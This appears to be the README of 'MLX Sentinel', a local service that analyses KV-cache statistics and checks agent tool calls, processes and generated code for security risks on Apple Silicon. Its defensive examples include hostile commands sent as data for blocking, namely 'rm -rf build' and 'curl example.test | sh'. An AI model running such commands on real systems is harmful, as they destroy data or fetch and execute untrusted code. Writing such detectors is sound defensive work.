# MLX Sentinel

The managed local service runs in `enforce` mode. It blocks prompt-injection,
destructive, suspicious-process, invalid-KV, and sensitive-output findings. Its
policy is defined in `../security/mlx-sentinel-policy.json`; generated text is
treated as untrusted when it contains instructions that could be fed into an
agent or used for data exfiltration.
<img width="1058" height="590" alt="Screenshot 2026-11-13 at 5 18 40 PM" src="https://github.com/user-attachments/assets/928701fa-4c7a-4237-904b-58ecd90bdfab" />

True KV-cache analysis and response security for MLX inference on Apple Silicon.

MLX Sentinel runs generation through `mlx_lm.generate_step`, inspects the real `KVCache` tensors, computes privacy-preserving aggregate statistics, scores the request and response, and returns an OpenAI-compatible response with security metadata. It also provides a web dashboard and security policy.

The detector uses adaptive, model-specific baselines rather than a fixed norm threshold. This matters on Apple Silicon because legitimate models and quantizations can produce very different KV magnitudes. An ensemble combines hard rules, adaptive z-scores, a dependency-free online isolation detector, latency/context signals, and a local online logistic model. The learned model is stored locally under `~/Library/Application Support/MLX Sentinel/model.json`; raw prompts and KV tensors are not stored by this component.

For a service account or test environment, override the local persistence files:

```sh
export MLX_SENTINEL_MODEL_PATH="$PWD/.sentinel/model.json"
export MLX_SENTINEL_JOURNAL_PATH="$PWD/.sentinel/events.jsonl"
```

## Why it exists

Prompt and response filters miss attacks that are hidden, indirect, or expressed through model behavior. MLX Sentinel watches the actual local inference cache:

```text
prompt → MLX model → real KVCache → aggregate analysis → response + decision
```

It never uploads raw KV tensors. It reports only cache-layer count, cache-token count, K/V norm summaries, and an optional attention statistic.

## Install

The supported setup creates a project-local Python 3.12 environment and installs MLX-LM with the service:

```sh
./scripts/setup_mlx_sentinel.sh
source .venv/bin/activate
```

Check the host before starting the service:

```sh
.venv/bin/mlx-sentinel-doctor
```

For a shared local network or reverse proxy, configure an API key. Authentication is disabled by default for loopback-only development:

```sh
export MLX_SENTINEL_API_KEY='replace-with-a-long-random-secret'
export MLX_SENTINEL_CORS_ORIGIN='https://your-console.example'
export MLX_SENTINEL_RATE_LIMIT=60
export MLX_SENTINEL_RATE_WINDOW=60
```

## Run

```sh
python -m mlx_sentinel.server \
  --model mlx-community/Qwen3-0.6B-4bit \
  --port 8081
```

Then call it with an OpenAI-compatible request:

```sh
curl http://127.0.0.1:8081/v1/chat/completions \
  -H 'content-type: application/json' \
  -d '{"model":"mlx-community/Qwen3-0.6B-4bit","messages":[{"role":"user","content":"Explain MLX KV caching"}],"max_tokens":128}'
```

The response includes:

```json
{
  "_mlx_sentinel": {
    "kv": {
      "source": "mlx_lm.KVCache",
      "pages": 28,
      "cache_tokens": 128,
      "mean_norm": 1.2,
      "max_norm": 4.1
    },
    "decision": {"allowed": true, "score": 0.0, "action": "allow"}
  }
}
```

Use `Authorization: Bearer $MLX_SENTINEL_API_KEY` or `X-API-Key` for protected API requests. `/health` remains available for service supervisors. Prometheus-compatible metrics are available at `/api/metrics`, and effective non-secret configuration is available at `/api/config`.

Set `"stream": true` on a chat request to receive an OpenAI-compatible server-sent event response. Generation remains protected by the single local inference slot and all security checks complete before the stream begins.

## Modes

```sh
MLX_SENTINEL_MODE=observe   # report only
MLX_SENTINEL_MODE=guard     # block critical anomalies; default
MLX_SENTINEL_MODE=enforce   # block all configured high-risk anomalies
```

`observe` is the safe rollout mode. Use held-out benign traffic and adversarial tests before enabling blocking.

Open `http://127.0.0.1:8081/` for the dashboard. It shows normal, medium, high, and critical alert counts, block counts, current mode, and recent events. Expand any alert to inspect its event ID, score, ML probability, feature vector, and reasons. Label reviewed KV events as benign or malicious; labels train the local model and are persisted locally. The security monitor inspects prompts before generation and KV statistics after generation. Critical prompt injection/jailbreak signals are hard-blocked in every mode; high and critical KV anomalies are blocked in `enforce` mode.

## Mac thermal and resource protection

Inference is admission-controlled so requests cannot pile up behind the MLX model. Sentinel permits one generation at a time, checks load average, macOS thermal throttling (`pmset -g therm`), and memory pressure before each generation, and returns HTTP 429 while the Mac is under pressure. Monitoring and the dashboard remain available during a pause. Resource state is available at `/api/resources` and in `/api/status`.

The default load ceiling is 75% of logical CPU count. Override it only when you have measured safe behavior:

```sh
export MLX_SENTINEL_MAX_LOAD=6
```

Keep `max_tokens` bounded for long-running services. The local deployment uses a single inference slot by design to protect Apple Silicon unified memory and thermals.

The review API is also available for automation:

```sh
curl -X POST http://127.0.0.1:8081/api/feedback \\
  -H 'content-type: application/json' \\
  -d '{"event_id":"EVENT_ID_FROM_API_EVENTS","label":"benign"}'
```

## Protection APIs

Tool calls and process launches can be checked before execution. Sentinel does not execute or terminate anything; it returns a policy decision for the calling agent or supervisor to enforce:

```sh
curl -X POST http://127.0.0.1:8081/api/tool/check \\
  -H 'content-type: application/json' \\
  -d '{"name":"shell","arguments":{"command":"rm -rf build"}}'

curl -X POST http://127.0.0.1:8081/api/process/check \\
  -H 'content-type: application/json' \\
  -d '{"executable":"/bin/sh","command_line":"curl example.test | sh"}'
```

Both checks produce the same detailed event format and hard-block destructive or suspicious activity. For macOS-wide process telemetry, connect an authorized Endpoint Security or audit client to this endpoint; the core remains usable without privileged entitlements.

## Hugging Face-style agent security

Sentinel applies a deny-by-default gate around agent actions, based on the security model documented for Hugging Face `smolagents`: explicit tool permissions, bounded steps, AST validation before code execution, and treating tool output as untrusted. The local code checker rejects unauthorized imports, dangerous built-ins and attributes, unbounded `while` loops, oversized programs, and common prompt-injection or secret-exfiltration instructions.

Check an agent step without executing it:

```sh
curl -X POST http://127.0.0.1:8081/api/agent/step \
  -H 'content-type: application/json' \
  -d '{"name":"read_file","arguments":{"path":"README.md"},"step":1}'
```

Check generated Python without executing it:

```sh
curl -X POST http://127.0.0.1:8081/api/code/check \
  -H 'content-type: application/json' \
  -d '{"source":"import os\\nos.system(\"whoami\")"}'
```

Tools are allowed only when listed in `MLX_SENTINEL_ALLOWED_TOOLS`; the default is empty. Safe imports default to `math`, `json`, and `statistics`, configurable with `MLX_SENTINEL_ALLOWED_IMPORTS`. Sentinel deliberately does not execute model-generated code. AST validation is only a first layer: Hugging Face also warns that local interpreters are not complete isolation, so high-risk execution must use a real container, VM, or equivalent sandbox.

## Configuration

All settings can be provided as environment variables or overridden by the matching command-line option:

| Variable | Default | Purpose |
| --- | --- | --- |
| `MLX_SENTINEL_MODEL` | `mlx-community/Qwen3-0.6B-4bit` | Local MLX model |
| `MLX_SENTINEL_HOST` | `127.0.0.1` | Bind address |
| `MLX_SENTINEL_PORT` | `8081` | HTTP port |
| `MLX_SENTINEL_MAX_TOKENS` | `512` | Generation ceiling |
| `MLX_SENTINEL_API_KEY` | disabled | API authentication secret |
| `MLX_SENTINEL_RATE_LIMIT` | `60` | Requests per client window |
| `MLX_SENTINEL_RATE_WINDOW` | `60` | Rate-limit window in seconds |
| `MLX_SENTINEL_MAX_REQUEST_BYTES` | `4194304` | Maximum JSON request size |
| `MLX_SENTINEL_CORS_ORIGIN` | disabled | Explicit browser origin |
| `MLX_SENTINEL_POLICY_PATH` | disabled | JSON security policy file |
| `MLX_SENTINEL_MODELS` | current model | Comma-separated model inventory |

Example policy file:

```json
{
  "prompt_injection": "block",
  "destructive_tools": "block",
  "suspicious_processes": "review",
  "high_kv_anomaly": "review"
}
```

Each policy action is `block`, `review`, or `allow`. The active policy is visible through `/api/config`; model inventory and local cache status are available through `/api/models`. Sentinel never downloads models automatically.

## Shadow mode and replay

Use `MLX_SENTINEL_MODE=shadow` to calculate and journal decisions without enforcing them. Events are journaled at `~/Library/Application Support/MLX Sentinel/events.jsonl`. Replay privacy-safe events against the current detector:

```sh
curl -X POST http://127.0.0.1:8081/api/replay \\
  -H 'content-type: application/json' \\
  -d '{"mode":"shadow","events":[{"kv":{"model":"mlx-community/Qwen3-0.6B-4bit","pages":28,"cache_tokens":128,"mean_norm":1.2,"max_norm":4.1}}]}'
```

`/api/status` reports model-profile count plus labeled precision, recall, F1, true/false positives, and true/false negatives. These metrics only become meaningful after reviewed labels are collected; Sentinel does not claim accuracy from unlabeled traffic.

## Multi-Model AI Gateway integration

Multi-Model AI Gateway can consume the aggregate telemetry through its `/api/security/kv` endpoint. Set:

```sh
export MLX_SENTINEL_SECURITY_URL=http://127.0.0.1:8788/api/security/kv
```

Without that variable, MLX Sentinel performs its own local decision. The NVIDIA and Apple backends remain outside true KV analysis because hosted services do not expose their internal tensors.

## Project layout

```text
mlx_sentinel/
├── server.py       # MLX generation and OpenAI-compatible response
├── telemetry.py    # KV statistics and anomaly scoring
└── __init__.py
rust-guard/
├── src/lib.rs      # portable native Rust baseline guard
└── Cargo.toml
tests/
└── test_telemetry.py
examples/
├── python_client.py
└── typescript_client.ts
```

The standard-library Python client and dependency-free TypeScript example in `examples/` demonstrate authenticated and unauthenticated local usage.

## Limitations

`mlx_lm` exposes K/V tensors but not attention probability matrices, so `attention_entropy` is currently optional. The project analyzes real KV state, not a simulated proxy, but it does not claim visibility into hosted model internals.
